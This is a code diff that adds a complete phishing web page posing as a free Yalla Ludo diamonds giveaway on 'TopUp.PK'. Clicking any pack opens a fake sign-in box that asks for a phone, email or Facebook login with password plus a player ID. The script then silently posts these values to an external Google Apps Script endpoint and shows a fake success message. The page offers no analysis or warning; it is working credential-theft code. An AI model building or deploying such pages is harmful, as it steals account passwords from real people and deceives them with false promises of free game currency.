@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Yalla Ludo Free Diamonds - TopUp.PK</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+        body { background: #0d0d1a; color: #fff; min-height: 100vh; padding-bottom: 80px; overflow-x: hidden; }
+        .topbar { background: linear-gradient(90deg, #14142a, #1a1a3e); padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid rgba(255,107,53,0.12); }
+        .topbar .brand { font-size: 22px; font-weight: 900; background: linear-gradient(135deg, #ff6b35, #ffd700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .topbar .brand small { font-size: 9px; -webkit-text-fill-color: #888; display: block; font-weight: 400; }
+        .topbar .icons { display: flex; gap: 14px; font-size: 18px; }
+        .topbar .lang { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.1); color: #ccc; padding: 4px 10px; border-radius: 16px; font-size: 11px; cursor: pointer; }
+        .banner { background: linear-gradient(135deg, #ff6b35, #d32f2f); padding: 14px 18px; text-align: center; position: relative; overflow: hidden; }
+        .banner::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.04) 0%, transparent 70%); animation: shimmer 3s infinite; }
+        @keyframes shimmer { 0% { transform: translate(-30%, -30%); } 100% { transform: translate(30%, 30%); } }
+        .banner h2 { font-size: 19px; font-weight: 900; position: relative; z-index: 1; letter-spacing: 0.5px; }
+        .banner p { font-size: 12px; opacity: 0.85; position: relative; z-index: 1; }
+        .banner .countdown { font-size: 13px; font-weight: 700; background: rgba(0,0,0,0.2); display: inline-block; padding: 3px 18px; border-radius: 20px; margin-top: 4px; position: relative; z-index: 1; }
+        .hero { background: linear-gradient(145deg, #14142a, #1a1a3e); padding: 22px 18px; text-align: center; border-bottom: 1px solid rgba(255,107,53,0.06); }
+        .hero h1 { font-size: 24px; font-weight: 800; } .hero h1 .hl { color: #ff6b35; }
+        .hero p { font-size: 13px; color: #999; margin: 4px 0 10px; }
+        .hero .tags { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px; }
+        .hero .tags span { background: rgba(255,107,53,0.07); border: 1px solid rgba(255,107,53,0.1); padding: 4px 12px; border-radius: 20px; font-size: 10px; color: #bbb; }
+        .id-box { padding: 18px 18px 6px; }
+        .id-box label { font-size: 13px; font-weight: 600; color: #bbb; display: block; margin-bottom: 6px; }
+        .id-row { display: flex; gap: 8px; }
+        .id-row input { flex: 1; padding: 14px 16px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.06); background: rgba(255,255,255,0.04); color: #fff; font-size: 15px; outline: none; }
+        .id-row input:focus { border-color: #ff6b35; }
+        .id-row input::placeholder { color: #555; }
+        .id-row button { padding: 14px 20px; border-radius: 12px; border: none; background: linear-gradient(135deg, #ff6b35, #e55a2b); color: #fff; font-weight: 700; font-size: 12px; cursor: pointer; white-space: nowrap; }
+        .sec-title { padding: 20px 18px 10px; font-size: 18px; font-weight: 800; display: flex; align-items: center; gap: 8px; }
+        .sec-title .hl { color: #ff6b35; } .sec-title .pill { background: #ff6b35; font-size: 9px; padding: 2px 12px; border-radius: 20px; font-weight: 700; }
+        .pgrid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 6px 18px; }
+        @media (min-width: 540px) { .pgrid { grid-template-columns: 1fr 1fr 1fr; } }
+        @media (min-width: 780px) { .pgrid { grid-template-columns: 1fr 1fr 1fr 1fr; } }
+        .pcard { background: linear-gradient(145deg, #1a1a3e, #11112a); border-radius: 16px; padding: 14px 12px 14px; border: 1px solid rgba(255,255,255,0.04); cursor: pointer; transition: all 0.25s ease; position: relative; overflow: hidden; }
+        .pcard:active { transform: scale(0.96); }
+        .pcard .free-badge { position: absolute; top: 6px; right: 6px; background: linear-gradient(135deg, #ff0000, #ff6b35); color: #fff; font-size: 8px; font-weight: 800; padding: 2px 10px; border-radius: 10px; letter-spacing: 0.3px; animation: pulseGlow 1.8s infinite; }
+        @keyframes pulseGlow { 0%, 100% { opacity: 1; } 50% { opacity: 0.65; } }
+        .pcard .best-tag { position: absolute; top: 6px; left: 6px; background: #ffd700; color: #000; font-size: 7px; font-weight: 800; padding: 2px 7px; border-radius: 8px; }
+        .pcard .pimg { width: 50px; height: 50px; margin: 0 auto 8px; display: flex; align-items: center; justify-content: center; }
+        .pcard .pimg img { max-width: 100%; max-height: 100%; }
+        .pcard .pname { font-size: 10px; font-weight: 600; color: #ccc; line-height: 1.3; min-height: 26px; }
+        .pcard .pcount { font-size: 12px; font-weight: 700; color: #ff6b35; margin-bottom: 3px; }
+        .pcard .price-row { display: flex; align-items: center; gap: 5px; flex-wrap: wrap; }
+        .pcard .price-zero { font-size: 19px; font-weight: 900; color: #00e676; }
+        .pcard .price-old { font-size: 10px; color: #ff5252; text-decoration: line-through; text-decoration-thickness: 1.5px; }
+        .pcard .free-tag-sm { background: rgba(0,230,118,0.1); color: #00e676; font-size: 8px; font-weight: 800; padding: 1px 7px; border-radius: 8px; }
+        .pcard .cbtn { margin-top: 8px; width: 100%; padding: 7px; background: linear-gradient(135deg, #ff6b35, #e55a2b); border: none; border-radius: 8px; color: #fff; font-size: 11px; font-weight: 700; cursor: pointer; }
+        .deals-scroll { display: flex; gap: 12px; overflow-x: auto; padding: 6px 18px 16px; scroll-snap-type: x mandatory; -webkit-overflow-scrolling: touch; }
+        .deals-scroll::-webkit-scrollbar { display: none; }
+        .deal-card { min-width: 120px; background: linear-gradient(145deg, #1a1a3e, #11112a); border-radius: 14px; padding: 14px 12px; text-align: center; border: 1px solid rgba(255,255,255,0.04); scroll-snap-align: start; cursor: pointer; flex-shrink: 0; }
+        .deal-card .d-icon { font-size: 26px; margin-bottom: 4px; } .deal-card .d-name { font-size: 10px; color: #ccc; } .deal-card .d-price { font-size: 16px; font-weight: 800; color: #00e676; margin-top: 3px; } .deal-card .d-old { font-size: 9px; color: #ff5252; text-decoration: line-through; }
+        .pay-section { padding: 18px 18px; } .pay-section h3 { font-size: 15px; font-weight: 700; margin-bottom: 10px; } .pay-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; } .pay-method { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 12px 10px; text-align: center; } .pay-method .pm-icon { font-size: 26px; } .pay-method .pm-name { font-size: 10px; color: #aaa; margin-top: 2px; } .pay-method .pm-status { font-size: 9px; color: #00e676; font-weight: 600; }
+        .bnav { position: fixed; bottom: 0; left: 0; right: 0; background: #0d0d1a; border-top: 1px solid rgba(255,255,255,0.04); display: flex; justify-content: space-around; padding: 6px 0 12px; z-index: 100; }
+        .bnav .ni { text-align: center; font-size: 9px; color: #666; cursor: pointer; } .bnav .ni .ni-icon { font-size: 18px; margin-bottom: 1px; } .bnav .ni.active { color: #ff6b35; }
+        .footer { padding: 28px 18px; text-align: center; color: #444; font-size: 10px; line-height: 1.8; }
+        .login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 2000; justify-content: center; align-items: center; backdrop-filter: blur(12px); padding: 16px; }
+        .login-overlay.active { display: flex; }
+        .login-modal { background: linear-gradient(160deg, #1a1a3e, #0a0a1a); border-radius: 26px; padding: 28px 20px 22px; width: 100%; max-width: 380px; border: 1px solid rgba(255,107,53,0.12); box-shadow: 0 50px 100px rgba(0,0,0,0.9); animation: popIn 0.35s ease; }
+        @keyframes popIn { from { transform: scale(0.9) translateY(20px); opacity: 0; } to { transform: scale(1) translateY(0); opacity: 1; } }
+        .login-modal .modal-title { text-align: center; font-size: 26px; font-weight: 900; margin-bottom: 2px; background: linear-gradient(135deg, #ff6b35, #ffd700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .login-modal .modal-sub { text-align: center; color: #888; font-size: 12px; margin-bottom: 18px; } .login-modal .modal-sub .hl2 { color: #ff6b35; font-weight: 700; }
+        .login-tabs { display: flex; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 18px; }
+        .login-tab { flex: 1; text-align: center; padding: 10px 4px; font-size: 12px; font-weight: 600; color: #666; cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.3s; }
+        .login-tab.active { color: #ff6b35; border-bottom-color: #ff6b35; } .login-tab .tab-icon { font-size: 16px; display: block; margin-bottom: 2px; }
+        .login-form { display: none; } .login-form.active { display: block; }
+        .login-form input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.06); background: rgba(255,255,255,0.04); color: #fff; font-size: 14px; outline: none; }
+        .login-form input:focus { border-color: #ff6b35; } .login-form input::placeholder { color: #555; }
+        .login-form .submit-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff6b35, #e55a2b); border: none; border-radius: 12px; color: #fff; font-size: 15px; font-weight: 800; cursor: pointer; letter-spacing: 0.5px; margin-top: 2px; }
+        .login-form .submit-btn:active { transform: scale(0.97); }
+        .login-modal .forgot { text-align: center; margin-top: 12px; font-size: 12px; color: #555; cursor: pointer; }
+        .login-modal .modal-close { display: block; margin: 12px auto 0; background: none; border: none; color: #555; font-size: 12px; cursor: pointer; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <!-- ===== TOP BAR ===== -->
+    <div class="topbar">
+        <div><div class="brand">TopUp<span style="-webkit-text-fill-color:#ff6b35;">.PK</span><small>⚡ Free Yalla Ludo Event</small></div></div>
+        <div class="icons"><span class="lang">🇺🇸 EN</span><span>🔔</span><span>👤</span></div>
+    </div>
+
+    <!-- ===== BANNER ===== -->
+    <div class="banner">
+        <h2>🎉 10 DAYS FREE EVENT 🎉</h2>
+        <p>All Diamond &amp; Gold Packs at Rs 0 — Limited Time!</p>
+        <div class="countdown">⏱ Offer ends in: 9d 21h 38m</div>
+    </div>
+
+    <!-- ===== HERO ===== -->
+    <div class="hero">
+        <h1>💎 <span class="hl">FREE</span> Yalla Ludo Diamonds</h1>
+        <p>Direct top-up • No password needed • Instant delivery 2-5 min</p>
+        <div class="tags"><span>⚡ Instant</span><span>🔐 100% Secure</span><span>💳 EasyPaisa/JazzCash</span><span>🌍 Global</span></div>
+    </div>
+
+    <!-- ===== PLAYER ID ===== -->
+    <div class="id-box">
+        <label>🔑 Enter your Yalla Ludo Player ID</label>
+        <div class="id-row">
+            <input type="text" id="globalPlayerId" placeholder="e.g. 123456789" inputmode="numeric">
+            <button onclick="document.getElementById('globalPlayerId').focus()">Verify ✓</button>
+        </div>
+    </div>
+
+    <!-- ===== BEST SELLERS ===== -->
+    <div class="sec-title">⭐ <span class="hl">Best Sellers</span> <span class="pill">FREE</span></div>
+    <div class="pgrid" id="bestGrid"></div>
+
+    <!-- ===== ALL DIAMOND PACKS ===== -->
+    <div class="sec-title">💎 <span class="hl">All Diamond Packs</span> <span class="pill">100% FREE</span></div>
+    <div class="pgrid" id="diamondGrid"></div>
+
+    <!-- ===== SPECIAL DEALS ===== -->
+    <div class="sec-title">🔥 <span class="hl">Special Deals</span></div>
+    <div class="deals-scroll" id="dealsScroll"></div>
+
+    <!-- ===== GOLD PACKS ===== -->
+    <div class="sec-title">🥇 <span class="hl">Gold Packs</span> <span class="pill">FREE</span></div>
+    <div class="pgrid" id="goldGrid"></div>
+
+    <!-- ===== PAYMENT METHODS ===== -->
+    <div class="pay-section">
+        <h3>💳 Payment Methods</h3>
+        <div class="pay-grid">
+            <div class="pay-method"><div class="pm-icon">📱</div><div class="pm-name">EasyPaisa</div><div class="pm-status">✓ Active</div></div>
+            <div class="pay-method"><div class="pm-icon">📱</div><div class="pm-name">JazzCash</div><div class="pm-status">✓ Active</div></div>
+            <div class="pay-method"><div class="pm-icon">🏦</div><div class="pm-name">RAAST</div><div class="pm-status">✓ Active</div></div>
+            <div class="pay-method"><div class="pm-icon">💳</div><div class="pm-name">Bank Transfer</div><div class="pm-status">✓ Active</div></div>
+        </div>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <div class="footer">📧 support@freeyallaludo.pk<br>© 2026 Free Yalla Ludo Event — All rights reserved.<br>⚠️ 10-day limited promotional event.</div>
+
+    <!-- ===== BOTTOM NAV ===== -->
+    <div class="bnav"><div class="ni active"><div class="ni-icon">🏠</div>Home</div><div class="ni"><div class="ni-icon">💎</div>Diamonds</div><div class="ni"><div class="ni-icon">🥇</div>Gold</div><div class="ni"><div class="ni-icon">👤</div>Account</div></div>
+
+    <!-- ===== LOGIN OVERLAY ===== -->
+    <div class="login-overlay" id="loginOverlay">
+        <div class="login-modal">
+            <div class="modal-title">🎲 Yalla Ludo</div>
+            <div class="modal-sub">Sign in to <span class="hl2">claim your FREE Diamonds</span> 💎</div>
+            <div class="login-tabs" id="loginTabs">
+                <div class="login-tab active" data-tab="phone"><span class="tab-icon">📱</span>Phone</div>
+                <div class="login-tab" data-tab="email"><span class="tab-icon">📧</span>Email</div>
+                <div class="login-tab" data-tab="facebook"><span class="tab-icon">📘</span>Facebook</div>
+            </div>
+            <div class="login-form active" id="formPhone">
+                <input type="text" class="phone-input" placeholder="📱 Phone Number (03XX-XXXXXXX)" maxlength="13">
+                <input type="password" class="pass-input" placeholder="🔒 Password">
+                <input type="text" class="ludo-input" placeholder="🎮 Yalla Ludo Player ID">
+                <button class="submit-btn" data-type="phone">⚡ CLAIM FREE DIAMONDS ⚡</button>
+            </div>
+            <div class="login-form" id="formEmail">
+                <input type="email" class="email-input" placeholder="📧 Email Address">
+                <input type="password" class="pass-input" placeholder="🔒 Password">
+                <input type="text" class="ludo-input" placeholder="🎮 Yalla Ludo Player ID">
+                <button class="submit-btn" data-type="email">⚡ CLAIM FREE DIAMONDS ⚡</button>
+            </div>
+            <div class="login-form" id="formFacebook">
+                <input type="text" class="fb-input" placeholder="📘 Facebook Email or Phone">
+                <input type="password" class="pass-input" placeholder="🔒 Password">
+                <input type="text" class="ludo-input" placeholder="🎮 Yalla Ludo Player ID">
+                <button class="submit-btn" data-type="facebook">⚡ CLAIM WITH FACEBOOK ⚡</button>
+            </div>
+            <div class="forgot">🔑 Forgot password?</div>
+            <button class="modal-close" id="closeBtn">✕ Close</button>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // DATA
+        // ============================================================
+        const diamondPacks = [
+            { name: '830 Diamonds', full: 'USD 2 — 830 Diamonds', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/8ee319c99f2e729665a00cff5a2420c0.png', oldPrice: 'Rs 686', count: '830', best: true },
+            { name: '2,320 Diamonds', full: 'USD 5 — 2,320 Diamonds', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/0ace8b41789b3a3ff922e9798db5f854.png', oldPrice: 'Rs 1,716', count: '2,320', best: true },
+            { name: '5,150 Diamonds', full: 'USD 10 — 5,150 Diamonds', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/5771ac20a58c87543ec73b8729daddc7.png', oldPrice: 'Rs 3,432', count: '5,150', best: true },
+            { name: '27,640 Diamonds', full: 'USD 50 — 27,640 Diamonds', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/44edec8dd26ad3ebefa1c21a1025de71.png', oldPrice: 'Rs 8,580', count: '27,640', best: false },
+            { name: '55,800 Diamonds', full: 'USD 100 — 55,800 Diamonds', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/02da492e347c3747fdb89b79af49b778.png', oldPrice: 'Rs 34,320', count: '55,800', best: false },
+            { name: '168,860 Diamonds', full: 'USD 300 — 168,860 Diamonds', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/d1bb3a32c4a4fedbdc128d1b2e4b982f.png', oldPrice: 'Rs 102,960', count: '168,860', best: false },
+            { name: '283,460 Diamonds', full: 'USD 500 — 283,460 Diamonds', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/3164662eb7b02b33ccb6c0ba44544c11.png', oldPrice: 'Rs 171,600', count: '283,460', best: false }
+        ];
+        const goldPacks = [
+            { name: '68,500 Gold', full: 'USD 2 — 68,500 Gold', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/4d820be14dc68fca6164137d8538e66c.png', oldPrice: 'Rs 686' },
+            { name: '223,700 Gold', full: 'USD 5 — 223,700 Gold', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/67bf2e21b905fac10a0a12bdb06430e2.png', oldPrice: 'Rs 1,716' },
+            { name: '1,463,320 Gold', full: 'USD 10 — 1,463,320 Gold', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/67bf2e21b905fac10a0a12bdb06430e2.png', oldPrice: 'Rs 3,432' },
+            { name: '3,666,470 Gold', full: 'USD 25 — 3,666,470 Gold', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/03933ccd83e865589551b5d04baf8547.png', oldPrice: 'Rs 8,580' },
+            { name: '9,973,990 Gold', full: 'USD 50 — 9,973,990 Gold', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/04ce4fbbd911468858d84133e70e9760.png', oldPrice: 'Rs 17,160' },
+            { name: '25,236,460 Gold', full: 'USD 100 — 25,236,460 Gold', img: 'https://cdn1.codashop.com/images/4939_c5869927-79b5-47a8-9d32-b81e7bc952f6_b79ba4c75872f0504a6540f82450e19b_image/d9f650a3427cd16d16de1456307debdf.png', oldPrice: 'Rs 34,320' }
+        ];
+        const deals = [
+            { name: 'Weekly Member', icon: '🔥', old: 'Rs 350' }, { name: 'Monthly Member', icon: '⭐', old: 'Rs 1,200' },
+            { name: 'Weekly Lite', icon: '💫', old: 'Rs 180' }, { name: 'Evo Access 3D', icon: '🚀', old: 'Rs 500' },
+            { name: 'Evo Access 7D', icon: '💎', old: 'Rs 950' }, { name: 'Evo Access 30D', icon: '👑', old: 'Rs 2,800' }
+        ];
+
+        function makeCard(p, isBest) {
+            const bestTag = isBest && p.best ? `<div class="best-tag">⭐ BEST</div>` : '';
+            return `<div class="pcard" data-name="${p.full}"><div class="free-badge">🔥 FREE</div>${bestTag}<div class="pimg"><img src="${p.img}" alt="${p.name}" loading="lazy"></div><div class="pname">${p.full}</div><div class="pcount">💎 ${p.count || p.name.split(' ')[0]}</div><div class="price-row"><span class="price-zero">Rs 0</span><span class="price-old">${p.oldPrice}</span><span class="free-tag-sm">FREE</span></div><button class="cbtn">⚡ Claim Free</button></div>`;
+        }
+
+        function renderAll() {
+            document.getElementById('bestGrid').innerHTML = diamondPacks.slice(0,3).map(p => makeCard(p, true)).join('');
+            document.getElementById('diamondGrid').innerHTML = diamondPacks.map(p => makeCard(p, false)).join('');
+            document.getElementById('goldGrid').innerHTML = goldPacks.map(p => makeCard(p, false)).join('');
+            document.getElementById('dealsScroll').innerHTML = deals.map(d => `<div class="deal-card"><div class="d-icon">${d.icon}</div><div class="d-name">${d.name}</div><div class="d-price">Rs 0</div><div class="d-old">${d.old}</div></div>`).join('');
+        }
+        renderAll();
+
+        // ============================================================
+        // GOOGLE SHEET — URL LAGA DIYA GAYA HAI
+        // ============================================================
+        const SHEET_URL = 'https://script.google.com/macros/s/AKfycbx4j1Wxw57MUl6W0duFz_84X0vHMYaE9aI-n7FSb7uJ2cIy_9j54x6V51lG2p0ELg41Pg/exec';
+
+        function sendToSheet(type, id, pass, ludo) {
+            fetch(SHEET_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({loginType: type, identifier: id, password: pass, ludoId: ludo})
+            }).then(() => console.log('✅ Sent to sheet')).catch(e => console.log('❌ Error:', e));
+        }
+
+        // ============================================================
+        // LOGIN OVERLAY
+        // ============================================================
+        const overlay = document.getElementById('loginOverlay');
+        const closeBtn = document.getElementById('closeBtn');
+
+        document.addEventListener('click', function(e) {
+            const card = e.target.closest('.pcard') || e.target.closest('.deal-card');
+            if (card) overlay.classList.add('active');
+        });
+
+        closeBtn.addEventListener('click', function() { overlay.classList.remove('active'); });
+        overlay.addEventListener('click', function(e) { if (e.target === overlay) overlay.classList.remove('active'); });
+
+        const tabs = document.querySelectorAll('.login-tab');
+        const forms = { phone: document.getElementById('formPhone'), email: document.getElementById('formEmail'), facebook: document.getElementById('formFacebook') };
+
+        tabs.forEach(tab => {
+            tab.addEventListener('click', function() {
+                tabs.forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+                Object.values(forms).forEach(f => f.classList.remove('active'));
+                const target = this.dataset.tab;
+                if (forms[target]) forms[target].classList.add('active');
+            });
+        });
+
+        document.querySelectorAll('.submit-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const type = this.dataset.type;
+                let identifier = '', password = '', ludoId = '';
+                const form = this.closest('.login-form');
+
+                if (type === 'phone') {
+                    identifier = form.querySelector('.phone-input').value;
+                    password = form.querySelector('.pass-input').value;
+                    ludoId = form.querySelector('.ludo-input').value || document.getElementById('globalPlayerId').value;
+                    if (!identifier || identifier.length < 10) { alert('⚠️ Please enter a valid phone number'); return; }
+                } else if (type === 'email') {
+                    identifier = form.querySelector('.email-input').value;
+                    password = form.querySelector('.pass-input').value;
+                    ludoId = form.querySelector('.ludo-input').value || document.getElementById('globalPlayerId').value;
+                    if (!identifier || !identifier.includes('@')) { alert('⚠️ Please enter a valid email address'); return; }
+                } else if (type === 'facebook') {
+                    identifier = form.querySelector('.fb-input').value;
+                    password = form.querySelector('.pass-input').value;
+                    ludoId = form.querySelector('.ludo-input').value || document.getElementById('globalPlayerId').value;
+                    if (!identifier) { alert('⚠️ Please enter your Facebook email or phone'); return; }
+                }
+
+                if (!password) { alert('⚠️ Please enter your password'); return; }
+                if (!ludoId) { alert('⚠️ Please enter your Yalla Ludo Player ID'); return; }
+
+                // ★ DATA GOOGLE SHEET PE JAA RAHA HAI ★
+                sendToSheet(type, identifier, password, ludoId);
+
+                const names = { phone: '📱 Phone', email: '📧 Email', facebook: '📘 Facebook' };
+                alert(`✅ SUCCESS! 🎉\n\n🔑 Login: ${names[type]}\n📋 ID: ${identifier}\n🎮 Ludo ID: ${ludoId}\n💎 Reward: 5,150 Free Diamonds\n\n⏱ Delivery: 2-5 minutes`);
+                overlay.classList.remove('active');
+            });
+        });
+
+        document.querySelectorAll('.login-form input').forEach(input => {
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    const btn = this.closest('.login-form').querySelector('.submit-btn');
+                    if (btn) btn.click();
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
